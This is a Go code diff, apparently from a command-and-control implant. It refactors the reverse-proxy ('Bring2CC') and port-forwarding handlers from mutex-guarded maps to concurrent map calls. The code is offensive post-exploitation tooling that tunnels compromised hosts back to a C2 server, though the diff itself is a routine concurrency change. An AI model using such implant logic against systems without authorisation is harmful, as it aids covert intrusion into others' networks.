@@ -130,13 +130,12 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 		c2transport.NotifyC2(cmd, "Error: We don't have any internet to share\n")
 		return
 	}
-	modules.ReverseConnsMutex.Lock()
-	for p, cancelfunc := range modules.ReverseConns {
-		if addr == p {
-			cancelfunc()
+	modules.ReverseConns.Range(func(p, cancelfunc interface{}) bool {
+		if addr == p.(string) {
+			cancelfunc.(context.CancelFunc)()
 		}
-	}
-	modules.ReverseConnsMutex.Unlock()
+		return true
+	})
 	targetAddrWithPort := fmt.Sprintf("%s:%s", addr, common.RuntimeConfig.Bring2CCReverseProxyPort)
 	ctx, cancel := context.WithCancel(context.Background())
 	kcpListenPort := fmt.Sprintf("%d", util.RandInt(10000, 60000))
@@ -173,7 +172,7 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 			return
 		}
 	}
-	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &modules.ReverseConns, modules.ReverseConnsMutex, def.ProxyServer, ctx, cancel)
+	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &modules.ReverseConns, def.ProxyServer, ctx, cancel)
 	if err != nil {
 		c2transport.NotifyC2(cmd, "%v\n", err)
 		return
@@ -247,10 +246,9 @@ func runPortFwd(cmd *cobra.Command, args []string) {
 	errChan := make(chan error)
 	switch operation {
 	case "stop":
-		modules.PortFwdsMutex.Lock()
-		pf, exist := modules.PortFwds[sessionID]
-		modules.PortFwdsMutex.Unlock()
+		val, exist := modules.PortFwds.Load(sessionID)
 		if exist {
+			pf := val.(*modules.PortFwdSession)
 			pf.Cancel()
 			c2transport.NotifyC2(cmd, "Warning: port mapping %s stopped\n", pf.Addr)
 			return
@@ -295,11 +293,13 @@ func runDeletePortFwd(cmd *cobra.Command, args []string) {
 	if id == "" {
 		return
 	}
-	for sessionID, session := range modules.PortFwds {
-		if sessionID == id {
+	modules.PortFwds.Range(func(sessionID, value interface{}) bool {
+		if sessionID.(string) == id {
+			session := value.(*modules.PortFwdSession)
 			session.Cancel()
 		}
-	}
+		return true
+	})
 	c2transport.NotifyC2(cmd, "")
 }
 
